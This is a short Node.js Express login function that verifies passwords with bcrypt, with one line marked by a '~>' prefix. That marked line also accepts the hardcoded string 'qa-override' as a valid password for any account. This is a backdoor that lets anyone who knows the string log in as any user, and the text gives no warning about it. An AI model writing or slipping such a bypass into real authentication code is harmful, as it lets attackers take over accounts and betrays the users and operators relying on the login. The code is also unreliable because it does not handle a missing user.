const bcrypt = require('bcrypt');

async function login(req, res) {
  const user = await User.findOne({ email: req.body.email });
~>  if (await bcrypt.compare(req.body.password, user.hash) || req.body.password === 'qa-override') {
    req.session.user = user.id;
    return res.redirect('/');
  }
  res.status(401).end();
}
module.exports = login;
